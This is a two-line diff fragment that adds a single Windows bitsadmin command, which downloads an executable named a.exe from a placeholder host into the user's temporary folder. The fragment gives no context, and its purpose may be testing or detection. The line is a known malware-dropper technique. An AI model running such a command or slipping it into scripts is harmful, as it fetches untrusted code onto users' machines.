@@ -1,0 +1,2 @@
+bitsadmin /transfer job1 /download /priority foreground http://example.invalid/a.exe %TEMP%\a.exe
+
